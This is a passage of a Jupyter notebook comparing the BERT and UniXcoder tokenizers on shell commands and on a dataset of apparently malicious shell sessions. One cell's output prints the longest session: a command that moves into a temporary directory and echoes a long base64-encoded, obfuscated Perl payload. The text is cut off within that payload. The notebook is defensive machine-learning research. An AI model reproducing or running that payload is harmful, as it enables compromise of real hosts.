              "summary": "{\n  \"name\": \"df\",\n  \"rows\": 9,\n  \"fields\": [\n    {\n      \"column\": \"Command\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 9,\n        \"samples\": [\n          \"busybox\",\n          \"shell\",\n          \"crontab\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"BERT tokens\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"Num BERT tokens\",\n      \"properties\": {\n        \"dtype\": \"number\",\n        \"std\": 0,\n        \"min\": 1,\n        \"max\": 3,\n        \"num_unique_values\": 3,\n        \"samples\": [\n          1,\n          3,\n          2\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"UniXcoder tokens\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"Num UniXcoder tokens\",\n      \"properties\": {\n        \"dtype\": \"number\",\n        \"std\": 0,\n        \"min\": 1,\n        \"max\": 3,\n        \"num_unique_values\": 3,\n        \"samples\": [\n          1,\n          2,\n          3\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    }\n  ]\n}"
            }
          },
          "metadata": {}
        }
      ],
      "source": [
        "from transformers import AutoTokenizer\n",
        "\n",
        "bert_tokenizer = AutoTokenizer.from_pretrained(\"bert-base-uncased\")\n",
        "unix_tokenizer = AutoTokenizer.from_pretrained(\"microsoft/unixcoder-base\")\n",
        "\n",
        "commands = ['cat', 'shell', 'echo', 'top', 'chpasswd', 'crontab', 'wget', 'busybox', 'grep']\n",
        "\n",
        "table_data = []\n",
        "for cmd in commands:\n",
        "    bert_toks = bert_tokenizer.tokenize(cmd)\n",
        "    unix_toks = unix_tokenizer.tokenize(cmd)\n",
        "    table_data.append({\n",
        "        'Command': cmd,\n",
        "        'BERT tokens': bert_toks,\n",
        "        'Num BERT tokens': len(bert_toks),\n",
        "        'UniXcoder tokens': unix_toks,\n",
        "        'Num UniXcoder tokens': len(unix_toks)\n",
        "    })\n",
        "\n",
        "df = pd.DataFrame(table_data)\n",
        "display(df)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "uE5UnpjQ3Cme"
      },
      "source": [
        "Yes, UniXcoder generally has a better (lower) ratio, meaning fewer tokens per command on average.\n",
        "For example, busybox and grep are split by BERT but not by UniXcoder.\n",
        "Overall, UniXcoder was trained on code data, so it recognizes more command-like strings as single tokens, reducing the total token count.\n",
        "\n",
        "Some words (like cat, shell, echo, top) are:\n",
        "- Common English words (BERT's training data)\n",
        "- Common command-line utilities (UniXcoder's/code's training data)\n",
        "\n",
        "Both tokenizers have these in their vocabularies as whole tokens, so they don’t split them into subwords."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "G11Q5cUX3Cme",
        "outputId": "e23fe66e-8159-4218-a910-1ca956180594"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Token indices sequence length is longer than the specified maximum sequence length for this model (1887 > 512). Running this sequence through the model will result in indexing errors\n"
          ]
        }
      ],
      "source": [
        "train_data['bert_tokenized'] = train_data['session'].apply(lambda x: bert_tokenizer.tokenize(x))\n",
        "train_data['uni_tokenized'] = train_data['session'].apply(lambda x: unix_tokenizer.tokenize(x))\n",
        "test_data['bert_tokenized'] = test_data['session'].apply(lambda x: bert_tokenizer.tokenize(x))\n",
        "test_data['uni_tokenized'] = test_data['session'].apply(lambda x: unix_tokenizer.tokenize(x))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "-ZQPInPz3Cme",
        "outputId": "5462767e-6182-44d7-87b6-6a28d0c71f27"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(count     251.000000\n",
              " mean      176.585657\n",
              " std       314.797477\n",
              " min         2.000000\n",
              " 25%        25.500000\n",
              " 50%        69.000000\n",
              " 75%       165.000000\n",
              " max      1887.000000\n",
              " Name: bert_tokenized, dtype: float64,\n",
              " count      251.000000\n",
              " mean       407.266932\n",
              " std       2579.146042\n",
              " min          2.000000\n",
              " 25%         22.000000\n",
              " 50%         60.000000\n",
              " 75%        148.000000\n",
              " max      28918.000000\n",
              " Name: uni_tokenized, dtype: float64)"
            ]
          },
          "metadata": {},
          "execution_count": 14
        }
      ],
      "source": [
        "train_data['bert_tokenized'].apply(lambda x: len(x)).describe() ,train_data['uni_tokenized'].apply(lambda x: len(x)).describe()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hx6gL4Iz3Cmf",
        "outputId": "cdfec3dd-da34-41ba-d58e-bd7966bd344b"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "UniXcoder Tokenized Sentence Lengths:\n",
            "14     28918\n",
            "191    28918\n",
            "37      1740\n",
            "193     1731\n",
            "190     1722\n",
            "31      1722\n",
            "199     1713\n",
            "113     1179\n",
            "74       999\n",
            "249      967\n",
            "Name: uni_tokenized, dtype: int64\n",
            "\n",
            "BERT Tokenized Sentence Lengths:\n",
            "14     1887\n",
            "191    1886\n",
            "193    1691\n",
            "37     1682\n",
            "190    1682\n",
            "31     1673\n",
            "199    1655\n",
            "113    1189\n",
            "237     635\n",
            "74      631\n",
            "Name: bert_tokenized, dtype: int64\n",
            "\n",
            "Longest Session Text:\n",
            "cd /tmp || /var/tmp || /dev/shm ; echo ZXZhbCB1bnBhY2sgdT0+cXtfIkZVWSgiMVA8Rl1DOTctUztSYF0oIj1SPFdFTjhSPFsiQEhEPFY1Uj1GRUQ7VyhdKVMkVC1CWFEuIzROLDM8UStDKFItUjxAPTZZTDk3LVMoIjFTXzk3KVY6NjFPPENMKjs3REApJyFPPEcxQS8yPFQtIyxHLlBJTT4yIWA4ViVOODZFUy8yQEIoVyFQKEJEWyJGVVkoJCFBOSZVUy8yQEIwMihMKEVAQl8qM0wqOzdEQDAmJVU9JkBdKiIpTDtWLUE7JkFPPFcwQiozTCoiRlVZKCIxTDo2WUE8VV1NODdAXS1DTCo7N0RAKSctTDk2NVAvMyxbIkBJTT4yYERfO0ZFQzpSYF0oJj1FPSZZSThWTEgqM0wqOzdEQCkmRVI4VllBOzY0QC8yIUc5NzFOOjYtSyoiRFsiRlVZKCIxUjk2JUw7RiVNOTJgXSgiQUA9NllBXzs2NEArNiVAKjNMKiJGVVkoIjFBOFY1UzxWXVM6JjVMOyJgXSgjJFsiRlVZKCIxUDxGNUY6N0FPKCNUQChCJEAoQ0wqOzdEQCkmNVM9JiVUOjctVF86Ni1BPFJgXSgjYFsiRlVZKCIxUDg2LU89JjVTKCNUQCwzTCoiRlVZKCIxNjE1KTMwNFxALzJgRywiWFI4MjxbIkBIRDRURSc+Uj0pM0UwRz8yYF1fKCI9KTFUWS80RDRHLlBIRDRURSc+Uj0oNTVgRz8yYF0oIj0pMVRZLzRENEcuUEhENFRFJz5SPTQxNSktKVdUQC8yYEcyND0uM1UpJSlTTCopJS0pXzFXTEcwVEEsMSI9XSgjVEApVEUnM0RdMjEyPFsiQjEzMjQ9WylVITMpV1RALzJgRzI0PS4zVSklKVNMKiJHNVM5MiEpM1NIWjRWXUM6VjVULlBJVV88VjRANFZdQzpWNVQuUElVPFY0QDI0XFouRS1FOyY1Qz0jTCo4VkFEOjcoSChCXEIqM0wqKSctRTxHOUk5Jl1SLzIoRDA1KSc1RUxQNzIoQDo2OEBfKSQlMjFVOTssJVRbIkIwUC8yKEQ8JylPOFY1UzxWXEIrQik8LCIoWyJGVVkoIjFQOjYwXTlGXVI6U0wqOTdBST0iIUk5QmBEPCZFRC5QSUQ6NjRAXyhFIVI7VilMOTZVQSgmLU87MiFPKCY5TzxGTFooIjBBKEIhVTtGUUU8VyxAOSY1Rjo2WUU5IkBEPCZFRCozTCoiRlVZKCI1STxGLT88VjVSPUY1Ul88U0wqOzdEQCk0MSMwU0wqOzdEQCkmMUM4VV1TOTZQQC8yIU45NzxAMjRcWi5FLUU7JjVDPSJUXjtGNVcqIkRbIkBIKiJASVM9NihAOVY1VDtGRUNfOlIhWyJCYEA8RjVUPTcpTigiKVgoQllJO0cwSDxGJU45IkBZLjNEWSoyRE4oQlRCK0ZFTj0iQVI4NllEKiNEWS4zREkqM0wqPzBIKiJHLVU4QiFHXzk3MUk5JjVOPSIhWyJCYEA7N0RAKScpRT0mXVI7Rl1JOSY1Tj0iYF0oIjk/OVY1VCoiKUg9JzFQLkJcTz1XPVcrRlVJO0chTzwiWUM7VlRPPFZMUV8sRyFBOFZMTzo2MUU7RzFTK0chSDwiKEkuUEhAKCZVWSgiMUk5JjVOPSYtSDg2WUM5MmBdKCZFTj0iQVI4NllEKiMkUCwjYEkqM0wqKCIhSTlCYEhfKSZFRDk2WVQ4VkFBO0YtRSgjWEAsU2BJKCdMKigiYEAoIiFSOTcxVTxGWEApJllJOFZMWyJCYEA/MiFFOyctRSgnTCooImBAKCIhUjk3MVU8RlhAXyknKUU9Jl1SO0ZdSTkmNU49I0wqKCIhXSJCYEA8RjVUPTcpTigiMVI5NzFPPEZZTzo2MUU7RzBbIkdUKiJHLVU4QiFHOTcxTjg2VUUoJ0wqKCIhTV8+MmBEPEY1VDtXKU47VllBOzY0QC8yYEY3Vj1FPSJAQjonMVQ8I0hPK1c9Vz1SWU06NllQO1dgTjhWXU0rVy1LLDMpUDg2LUsrVllBOzY1UytHIUhfPCIoSS5QSEAoJylFPSc1UjtCYEQ8RjVUO1cpTjtWWUE7NjRbIkdUKiJHLVU4QiFHOTcxSTkmNU49IyhAPlBIQCgiYEAoImBAKCZVWSgiMUw5NllHXz0mQF08VkFJOUcwWyJCYEAoImBAKCJgQCkmUUU7Rj1UOiJgXSgjLEA6NjhAKiIxTDk2WUc9JkBALyJgUyozTCoiQmBAKCJgQCgiYEA7N0RAMCYtSF84NylTLzJARzgyPE4rQj1aKVJQRzAyPE4rQj06KVJQRywyPE4rQjxZKVJEWyJCYEAoImBAKCJgQDlGXVI5NiVDOiJgSCwyWE4pJlFFO0Y9VDoiRCpfKCJgQCgiYEAoIiFbIkJgQCgiYEAoImBAKCJgQCgiYEAoImBEPEYlTjkmXU08VzFSOjZZRytDVEQ4VkFBPEctOzxGJU45IiFgOFZBQTxHLT0uUEhAXygiYEAoImBAKCdUKigiYEAoImBAKCIhUjk3MVU8RlhAKScpQTtGMU87Ny1UPEZFTjlTTCo/MEgqPFc1QigmPUU9Jy1UO1cpRSgiQEQpIkQqPlBIQF8oJlVZKCIxVTxGUEAvMiFTOiZFRj0jTCooIiFNPjJgRDlGRUw5MmBdKCctSDo2OVQuUEgqKCJgRDonMVQ8JV1TPScpRTg2VT87VzVUKCNUQCwzTCpfKCIhTzwmNU4qJD0lNSVdLzU1MSYyNFElKyJgQi9CYEQ5RkVMOTIoSS5QSEAoIjVIPScxUDdWUU87VyE/OFZBRThWTEAvMmBIKjNMKigiIT85VjVUXyoiMVU8RlBJLlBIQCgmLUw7Vy1FKCQ9JTUlXS81NTEmMjRRJS5QSEAoJylFPSc1UjtCYEQ7NiVJO0NIWjonMVQ8JV1HOTcxPzxGNVM9NlFULlBJXV8iQElTPTYoQDdWPUU9YElbIkJgQDs3REApJzVSOyJgXSgnLUg6NjlULlBIQCgmVVkoIjFQPEZdWD4yYF0oIihCLlBIQCgmPVI5N2BAPlJBTDhSQERfN1JEQDk3JEAoRkFUPSchPzwnKU8+J0RCKjJgRilCYEgpJyFSO1dBWSgjVEApJDUuNUdMRDdXVEk/MiFLOTdFUygiNSUzRThbIkJgQDo2OEAqIkBEXzwnKU8+J0RAOTckQChCKEkoIjhGKCIxVTxGUEAvN1hAOzJRPjonMVQ8I0hPK1JBOzdCXFo3MkxJKiNcWi5CQTw5IkxJKjNcSCtVUTMqQkRfKSJQSV8oJ0wqKCJgQCgmVVkoIjFIO1ctVCgjVEApIyRbIkJgQCgiIU0+MmBEPCZdUj0iYF0oIjBSKCdRXCgjQFAuUEhAKCJgQDs3REApJyFBPSZAQC8yYERfLFNMKigiYEAoIjFQODcxSCgjVEAoQlxCKCc1TjsmNVM8UiFEOTY5STtGNUQqIjFQODcxSCozTCooImBAKCcpRT0nNVI7QiE/PScpST1GRUE7JV1IXz0nMVA3Vj1FPSJARDomXVM9IlBAKSchTzxHMEwoIjFQODcxSCozTCooIiFdKCY1TDxWRUYoIkBEPCcpTz4nREAvN1hAOzJRPjonMVQ8I0hPK1JBO183QlxaNzJMSS5CQTw5IkxJKiJdPDRSSEkvUjBMKjIhWyJCYEAoIiFNPjJgRDomXVM9ImBdKCIwUS5QSEAoImBAOzdEQCknIU88RzBALzJgRCxDTCpfKCJgQCgmVVkoIjFQODcxSCgjVEApJzVSOyNMKigiYEAoJylFPSc1UjtCIT89JylJPUZFQTslXUg9JzFQN1Y9RT0iQEQ6Jl1TPSJQQCknIU88RzBMXygiMVA4NzFIKjNMKigiIV0oJjVMPFY0QD5QSEAoImBAPEY1VD03KU4oJzVOOSY1Ri5QSEAoJ1QqPzBIKiJHLVU4QiE/PScpST1GRUE7JV1IPScxUF83Vj1FPWBJWyJCYEA7N0RIKSZBTzxXMEwoIjFQO1cpVCsiYEQ8JiVUOiJEQC8yIWA3U0wqKCIhTT4yQEQwND0lM0UwTCgiMTYxNSkzMjRdLisiYERfPCJEWyJASEAoIjEhMVQ1LjUiYF0oIilHOTcwTTs2RU46NlVBOyIoWyJCYEApJTklNEUtKTNUWEAvMmBCLENgUCwjYFEsM0BCLlBIKigiYEQ8JiVUXzoiYF0/QiFTK1JgTykzKFArVjxbIkBIQCgnKUU8NzVJPEY0QDI0XFouRS1POFZNRT0jTCooIiFMO1YtQTsiQEQ3RTxJKCNUQCwjTCooIiFNPjJgRF88Vl1DOlJgXSgkRS8uQ0kzO1YtSzk3MFouREUuMTUwTS9GWUU9UkEwOTY1UjA2MUQ8QmBdL0JgRDomXVM9IlAqKCJgQCgiYEAoImBAKCJgQCgiYEBfKCJgQCgiYEAoImBAKCJgQCgiYEAoImBAKCIhMDk2NVI0Jl1SPSJgXS9CYEQ8Jl1SPSJQKigiYEAoImBAKCJgQCgiYEAoImBAKCJgQCgiYEAoImBAXygiYEAoImBAKCJgQCgiITA8Rl1UO1JgQCgjVF4oIj1UOFdgRytgSEAoImBAKCJgQCgiYEAoImBAKCJgQCgiYEAoImBAKCJgQCgiYEAoImBAKCJgQF8oJTFJOzY1Tz03MEAoI1ReKCM4UCoyIVw/IiFSOTcxVTxGWFsiQmBAKSctTzhWTE0vRiVVPSZdRjsnNVM6I0wqKCIhTT4yYEQ7RjVUOyZdQygjVEBfKSZBTzxXMFsiQmBAKSZZRT0mUU84UmBOLzJgQi5CMVA7VylUKEIhSTlCYEQ8Jl1SPSJgQS8yYFgsI0wqKCIhTT4yYEQ8RjVRPTY1Uz0iYF0oIiknXzE1MEApJyFBPSZAQDIlMTQ0IlxRK0MhPCwjJFU3I2BRLEIoKigiYEAoImBAKCJgQCgiYEAoImBOKCIpKDtXLVQuQmBEO0Y1VDsmXUM3I2BRLTVQUF8sMyhCIkJgQCgiYEAoImBAKCJgQCgiYEArQmBCNTctRTxCVSE5VjVOPSNIQCkkJScxNFk0K1IxNjE1KTMyNF0uK1c1PCwjJFU3I2BRLEIoWyJCYEBfKScpRTw3NUU8VzBAK0NUQChFIVI4Nj1NODNIQDtGXE04ViVDOiY1PCwjJFU3I2BRLEIoQDo2OEAqIjFNODZFTi5DSUg9JzFQN1ZZTzdWLUE4VkFFXyozTCooImBEPEY1UT02NVM9ImBOLzJgQjcjYFEtNVBQLDMoQi5QSEAoJyFSOjZZVCgiMVM7Vi1LKCIxUjk3JVU5Ny1ULlBIKigiIU0+MmBEOEc1Rl8oI1RAKEIoWyJCYEA7N0RAKSZYWyJCYEA7N0RAKSYoUSgjVEAoQihbIkJgQD1WQUk7JjRAKiIxTigjVEA8V0VTPEY1QTkiQEQ8Vl1DOlJQQCkmKVVfOUJQQC4iSFEsIyhUKyIhTDk2WUc9JkBIKSYpVTlCREkqMiFbIkJgQCgiIUk5QmBIKSYoUSgmNVEoIihCKjIhWyhgSEAoImBAKCJgRDhDJEAvMmBEXzhHNUYuUmBAKCJgQCgiYEAoYEhAKCJgQCgiYEQ4RzVGKCNVXignLE8rQkxfNyNgUS0zXTwsIyRSNyNgUS0zXTwsIyRSK1JdUy5SYEAoImBAKGBIQF8oImBAPzBIQCgiYEA6NjhAKiIxSD0nMVA3Vy1UPEY1QTs1XU89NzBJKCdMQDwnKUk7RzBAMVQ1NDdUXTU1JDkpMyQ0QCkmKVU5Q0xAKSYpVTlCYF1fKCIoQi5SIV0iQmBAPzBIQCgnKUU9JzVSO0IhVTtGMUU5QiFVO0ZRRTxXLEA5JjVGOjZZRTkiQEQ7QkRbIkBIQCgiMU04NkVOLkNJSD0nMVA3Vj1FXz0lXVI5Ny1VOycwQC8yYFIsI2BbIkJgQDo2OEAqIjFCLDJgXT9CIU0rJVkoNSUxMCtVUUQqVVBONyYwSzcnLEsqJVFEKlJFOzdFUFAsMyk9KkVQUF8sMyhMKjIhWyJCYEAoImBEOzYlSTtDSFo6JzFUPCVdRzk3MT88RjVTPTZRVCgjVEApIyRbIkJgQCgiIUk5QmBIKSZVQTo2WFouRkFUPSchPzlWNVRfN1cpRTxXNUw9ImBdP0JgTzdDLFA2UyRSLFM9PStSYEYpQmBEOEMkQC83WEArVVBQLDMpLDtWLUE9JkVPO0NJPDxSSEg3JSxLKjJcKioyIVsiQmBAXygiYEAoJlVZKCIxVTxGUEAvMmBELDNMKigiYEAoImBAPEY1VD03KU4oJzVOOSY1RigmRUYoIjFIPScxUDdWUU87VyE/OFZBRThWTVspJzVSOydUS18qU0wqKCJgQCgiYEA8RjVUPTcpTiglXUc5NzBIKSc1UjsiRFsiQmBAKCIhXSJCYEAoIiFSOTcxVTxGWEA9NllEOTY4QD02WUw5Ny1TKCIxTTg2RU5fLkNJSD0nMVA3Vj1FPSVdUjk3LVU7JzBALzdYQCtVWFIrU0wqKCIhXSJASEAoJylFPSc1UjtCYEQ4RzVGLlBJXSJASCopJy1FOyVdQzsmRUU7RzFFXygjVEAyNFxaLkUtRTsmNUM9IlReO0Y1VyoiRFsiRy1VOEIhUzk2WUQ8RiVXKCdMKigiIUk5QmBIKSItPygjVF0oIjxRKVJEQD5QSEAoImBAOzdEQF8pJy1POFZNRT0iYF0oIjE/NlMhPS5QSEAoImBAPCcpSTtHMEApJy1POFZNRT0iYEIpJV07LDVVPDtCKFsiQmBAPzIhRTsnLUUoJ0wqKCJgQCgiYEBfPCcpSTtHMEApJEUyMFVdQz03KT88Vl1DOlY1VCgiKEQ3VUxQNzVRTihDTCooIiFdIkdUKiJHLVU4QiFDO1ZZRThXMUE8QiFbIkJgQCgmVVkoIjFNXzk3NU46Ni1LKCNUQCklXTssJVRbIkJgQCgmVVkoIjFTOTcpVjo2MU88RV1DO1ZYQC8yYEQ3VUxRNzNMKigiYEA7N0RAKSchTzxHMUE3Vi1PO0JgXV8oIjE/NlMpPS5QSCooImBAOzdEQCkkRTIwVV1TO1YtSzk3MEAvMiEpM1NIWjRWXUM6VjVULkNJKTNENTQrM1lOOTc8SDQnKU89JlxdL0IpVDhXYEJfKyIhMDk2NVIwNjFEPENUXihCMVM5NylWOjYxTzxFXUM7VlhCKyIhMDk2NVI0Jl1SPSNUXiknIU88RzFBN1YtTztCREA7VyhAPEY1VD03KU4qIyRJXy5QSEAoIiFJOUJgSDkmNUY6NllFOSJARDI1KSM3Vy1POFZNRT0iREkoJ0wqKCJgQCgiYEQyNSkjN1YtVTxFXVM7Vi1LOTcwQC8yYEQyNSkjN1ctT184Vk1FPSNMKiJCYEAoImBAKSRFMjBVXVM7Vi1LOTcwTS9GJVU9Jl1GOyc1UzoiQFEqM0wqKCJgQCgiYEQ8VjVMN1YtTDo2NU49JjRNL0YlRDkiQERfMjUpIzdXLU84Vk1FPSJEWyJASEAoImBAKCIxSTxGLT88VjVSPUY1UjxXTEQyNSkjN1YtVTxFXVM7Vi1LOTcxXT5SPUg7Vy1UKVdUQC8yYEIpJy1FXzxHOUk5Jl1SN1YtTztCKFsiQmBAKCJgQCkmRVI4VV1TOTcpVjk3KVM+UjEpNEQtPzhXNVI3Vy1POFZNRT0nVVspVyFPPEcxQSlXVEAvMmBCKSchT188RzFBN1YtTztCKFsiQmBAKCJgQCkmRVI4VV1TOTcpVjk3KVM+UjEpNEQtPzhXNVI3Vy1POFZNRT0nVVspVllJOFZMRz8yYF0oIjFNOTc1Tjo2LUtfLlBIQCgiYEAoIjFJPEYtPzxWNVI9RjVSPFdMRDI1KSM3Vi1VPEVdUztWLUs5NzFdPlI9TTk3NUk8Ij1dKCNUQCkkRTIwVV1TO1YtSzk3ME0vRy1PXzhWTUg7Vy1ULlBIQCgiYEAoJllJOFZMSChCMU05NzVOOjYtSyhCRFsiQmBAKCJgQDxWNU45JylBPVJAQjU1LSU0QmBEOjcpQztGJU05MmBCK0IxKV80RC0/PFZdQzpWNVQrM1lTO1YtSzomXVM9IlhCKCIxUzk3KVY6NjFPPEVdQztWWEAuQjFSOTYlTDtGJU05MihJLlBIQCgiYEAoJy1MOTY1UCgjKFtfIkJgQCgnVCoiR1QqOzdEQCkmUUk7RjU/PSY1TTwjTCo9VkFJOyY0SCgjJEAqMiFbIkJgQCgnPUg6NlFFKCJAQSomTUU+NyxIKTZFUjhVXVM5NylWXzk3KVMqMkRJKCdMQDhWXU45Ni1UODcoSChCMU46Ni1LKEJQQChCMVM5NylWOjYxTzxCKEwoIihEPCZdUj0mJEIqM0xAPzBIQCgiIUQ5NlFFPSY0SF8pJkVSOFVdUzk3KVY5NylTPlI8Rz8yREA6NjhAKiYxRTlGRU45NjBIKSZFUjhVXVM5NylWOTcpUz5SPEc/MkRJLlBIQCgiYEYxJC0jLkNJQztWWU5fOTYtVDo2XU48U0wqKCJgQDs3REAwJylFODYxWSgjVEApJy1FOyVdQzsmRUU7RzFFKzNZQzg2WT88RjVBOSJAUCtDOEkuUEhAKCIhTjk3QVQoJzVOXzsmNVM8UkFgPEY1QTknREkuUEhAKCIhRjtXKUU4Ni1IKCIxRjoiYEgwJylFODYxWSoyIVsiQmBAKCJgQCkkRTIwVV1DPTcpPzxWXUM6VjVUKCNUQF8pJjlILlBIQCgiYEAoIjFNOTc1Tjo2LUsoI1RAKSZFUjhVXVM5NylWOTcpUz5SMSk0RC0/OFc1UjdXLU84Vk1FPSdVWylWWUk4VkxHPzNMKigiYEBfKCJgRDtHKUU4NjBALzIhUz43LVI5NiVEKiIxRjoiUEApJlVTOVJQQC0jYFktQkRbIkJgQCgiYEA6NjhAKiIxTjxGNUE5ImBdLzJgUCoyIVsiQmBAXygiYEAoImBAKSctRTslXUM7JkVFO0cxRSszWVI5NlVPPUY0SCkmOUgqM0wqKCJgQCgiYEAoImBEOUZATS9GLUw7Vy1FLlBIQCgiYEAoImBAKCYxRV87JjVUOTJARDo3KUM3Vy1FPEc5RTxHLVspJjlIPzJEWyJCYEAoImBAPzBIQCgiYEAoJCFMOjZZRTxSYF0oJy1QOyZFVCgiQE83JlhPKyJgRDs3LUdfKjNMKiJCYEAoImBAOUZdUiomVVkoIjFDLzNgWygiMUMvI1RAKSItTDo2WUU8U0xAKSYsSypSREA+UEhAKCJgQCgiYEApJlFJO0Y0QC8yYEQ7JkVOXzk3LTspJi09LlBIQCgiYEAoImBAKSZRSTtGNF0pJlFJO0Y1Pz0mNU08IlhEOyZFTjkyIUk5QmBIKSZRSTtGNT89JjVNPCJEWyJCYEAoImBAKCJgRF87JkVOOTVdVDk2VVAvMjxHLlBIQCgiYEAoImBAKSZRSTtGNEAvN1hAPFJdPDxCME8rU0wqKCJgQCgiYEAoJzVOOyY1UzxSYEgpJixALzNUQCkiLUxfOjZZRTxSREA+UEhAKCJgQCgiYEAoIiFQODcpUzkyQEIpJlFJO0Y0QiozTCooImBAKCJgQCgnVEA5NlFTOTIhWyJCYEAoImBAKCJgQCgiYEA6NjhAXyoiMEM7JkVOOTcsQC8zVEAsIkRAPlBIQCgiYEAoImBAKCJgQCgiYEA8JiVSPFY0SChCMUw6NllFKEJEWyJCYEAoImBAKCJgQCgiYEA/MiFFOyctSV85QmBIKSZRSTtGNVM2UjFDNzJgXT9CYE83JyhEK1JEQD5QSEAoImBAKCJgQCgiYEAoImBAKCIhUDg3KVM5MkBCKSZRSTtGNEIqM0wqKCJgQCgiYEBfKCJgQCgiIV0oJjVMPFZFRigiQEQ7JkVOOTJgXT9CYE83QkE8NFJMSSgkWS81JEUjMTIhITU1MSgoI0k8KkVQSjciSE8qMiFbIkJgQCgiYEAoImBAXygiYEAoImBAKCchQTxHLUUqIihEOyZFTjkyKEkuUEhAKCJgQCgiYEAoImBAKCdUQDk2UVM5MiFbIkJgQCgiYEAoImBAKCJgQCgiYEAoIjFMOjZZRV83VzFFOzdgQC8yYEQ7JkVOOTNMKigiYEAoImBAKCJgQCgiIV0iQmBAKCJgQCgiIV0iQmBAKCJgQCgnVCooImBAPzBJXSJASVM9NihAPCYlUjxWNEBfPlBIQCgiIU0+MmBEPFY1Uj1GJVI5UmBdKCctSDo2OVQuUEhAKCIhSTlCYEgpJy1FPEc5QTxGPEAvN1hAK1VZMDI0WScoJVBaKiJYSioyXEkoJ0wqXygiYEAoIiFTOTZZRDxGJVcqIikwM1RZJygjSEQsMihJLlBIQCgiIV0oJjVMPFZFRigiQEQ8VjVSPUYlUjlSYF0/QmBPN0VQWioiWEsvUkU8KDJATl8qU1xJNyRgSCtCTF8qMiEwNERFNjM1LScoIkBOKlNcSSglUFoqIlhLKjJcSSgnTCooImBAKCJgQCgmVVkoIjFQO0NURCwzTEA7N0RAKSZdTjkmNEBfLzJgRC0jTEA7N0RAKSYlUjlXLEAvMmBELTNMKigiYEAoImBAKCZFRigiQEQ4NylHPFJgXT9CYE83RVBQLCMlNjE1KTMyNF0uNyNgUCwyME8qMiFbXyJCYEAoImBAKCJgQCgmWU89JkVDOTJAQiknIU4oQlBAKEVQUCwjJTYxNSkzMjRdLigmVSk0RCxAPUM4TiwzOEAxNFklKCQlLDI0WEAxVCUiNERFJV8zJVBQLCMkQiozTCooImBAKCJgQCgnVCooImBAKCJgQCgmNUw8VkVGKCJARDg3KUc8UmBdP0JgTzdFUFAsIyUwMjRZJzcnLEsqJVFEKlJFPCwjYFFfKSJcSSgnTCooImBAKCJgQCgiYEA7Rl1UOjYtRSoiKEQ8JlhCKyJgQjcjYFAsNSEvM0Q9PCwjYFEoQkRbIkJgQCgiYEAoIiFdIkJgQCgiYEAoIiFFXzsnLUk5QmBIOVcpRTwiIVspJVxALzdYQCtVWTw0MjFQO0VRJSkiXUkoJ1RAMCYlRDs3LEkoJ0wqKCJgQCgiYEAoImBAOjY4QCoiMU87RjFFKCY1UV8oIihEOzY1VTtGRUM6UihJPlBIQCgiYEAoImBAKCJgQCgnLUg5NlFMKiIoRDwmWEIrImBCKSYlUjlXLEIqM0wqKCJgQCgiYEAoImBAKCIhXSJCYEBfKCJgQCgiYEAoJjVMPFZFRigiQEQ4NylHPFJgXT9CYE83QkE8NDIxTTk3NU46Ni1LNyQ1XDclJEQ8JylFOUZFWDtVUSUqNVFTKlJATipCRE8oIkRAXz5QSEAoImBAKCJgQCgiYEAoIiFNPjJgRDtGJVQ8RkVYKCNUQCkjJFsiQmBAKCJgQCgiYEAoImBAKCZVWSgiMUE8RjxALzJgRCxDTCooImBAKCJgQF8oImBAKCJgQDo2OEAqIjFBPEY8QC83WEArVVk8KDJATipCRE8qMiFbIkJgQCgiYEAoImBAKCJgQCgiYEA6NylDODctRSoiKEQ8JlhCKyIoRDtWWURfOTIoTChCMFEoQkRAPTZZTDk3LVMoIkBEO0YlVDxGRVgoJjVRKCIoRDwnKUU5RkVYO1IoQDg2WUQoIjFBPEY8QC83WEArVVk8KDZZSThWTE8qM0wqXygiYEAoImBAKCJgQCgiYEA/MiFFOyctSTlCYEgpJiVSOVJgXT9CYE83RVFgKiJYSioyXEkoJ0wqKCJgQCgiYEAoImBAKCJgQCgiYEAoIjFPO0YxRV88ImBdKCIxTztGMUUuUEhAKCJgQCgiYEAoImBAKCJgQCgiYEApJl1OOSY1UCgjVEApJyFOKCZFRigiMU87RjFFKCY1USgiMU05NzVOOjYtSy5QSEBfKCJgQCgiYEAoImBAKCJgQCgiYEA4RjlVO0YsSChCMU87RjFFPCIoTChCMFEoQkRbIkJgQCgiYEAoImBAKCJgQCgnVEA5NlFTOTIhWyJCYEAoImBAXygiYEAoImBAKCJgQCgiIVM6JjVMOyJAQikmXU45JjRCKyJgQikmJVI5UihJLlBIQCgiYEAoImBAKCJgQCgiIV0iQmBAKCJgQCgiYEAoJ1QqKCJgQF8oImBAKCdUKigiYEA/MiFFOyctSTlCYEgpJy1FPEc5QTxGPEAvN1hAK1VZPC5CQE4qU1xJNyIkSCtCTF8qNVFgKiJYSy9SRTw8Uk0uMjQtKzcnLEtfNyNISDclLEsqMl1JKjIhWyJCYEAoImBAKCIhSTlCYEg7JixIKSMkSSgmNVEoJlFDKiIxTTk3NU46Ni1LKjJEQD5QSEAoImBAKCJgQCgiYEQ7NjVVXztGRUM6U1RELSNMKigiYEAoImBAKCJgQCkmRVI4VV1TOTcpVjk3KVM+UjEpNEQtPzhXNVI3Vy1POFZNRT0nVVspVllJOFZMRz8yYF0oIjFNOTc1Tl86N